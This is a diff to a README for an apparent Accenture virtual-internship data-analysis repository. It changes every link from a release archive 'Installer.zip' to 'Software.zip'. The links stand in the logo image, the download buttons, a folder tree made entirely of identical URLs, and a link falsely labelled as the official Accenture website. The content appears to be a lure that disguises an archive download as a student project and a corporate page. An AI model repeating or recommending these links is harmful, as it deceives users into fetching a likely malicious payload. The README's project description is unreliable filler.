@@ -2,7 +2,7 @@
 
 ---
 
-![Accenture Logo](https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v1.0/Installer.zip)
+![Accenture Logo](https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -30,9 +30,9 @@ Are you an aspiring data analyst looking for hands-on industry experience? Look 
 ---
 
 ## 🚀 Quick Links:
-- [Download Accenture Data Analysis Virtual Internship](https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v1.0/Installer.zip)
+- [Download Accenture Data Analysis Virtual Internship](https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v2.0/Software.zip)
 
-[![Download Virtual Internship](https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v1.0/Installer.zip)](https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v1.0/Installer.zip)
+[![Download Virtual Internship](https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v2.0/Software.zip)](https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -41,22 +41,22 @@ Are you an aspiring data analyst looking for hands-on industry experience? Look 
 Forage-Accenture_Data_Analysis_Virtual_Internship/
 │
 ├── Data/
-│   ├── https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v1.0/Installer.zip
-│   ├── https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v1.0/Installer.zip
+│   ├── https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v2.0/Software.zip
+│   ├── https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v2.0/Software.zip
 │
 ├── Models/
-│   ├── https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v1.0/Installer.zip
-│   ├── https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v1.0/Installer.zip
+│   ├── https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v2.0/Software.zip
+│   ├── https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v2.0/Software.zip
 │
 ├── Presentations/
-│   ├── https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v1.0/Installer.zip
-│   ├── https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v1.0/Installer.zip
+│   ├── https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v2.0/Software.zip
+│   ├── https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v2.0/Software.zip
 │
 ├── Visualizations/
-│   ├── https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v1.0/Installer.zip
-│   ├── https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v1.0/Installer.zip
+│   ├── https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v2.0/Software.zip
+│   ├── https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v2.0/Software.zip
 │
-├── https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v1.0/Installer.zip
+├── https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v2.0/Software.zip
 ```
 
 ---
@@ -118,7 +118,7 @@ If the link doesn't work, please check the "Releases" section for updates!
 
 ---
 
-🔗 For more information, visit the official [Accenture website](https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v1.0/Installer.zip).
+🔗 For more information, visit the official [Accenture website](https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v2.0/Software.zip).
 
 ---
 
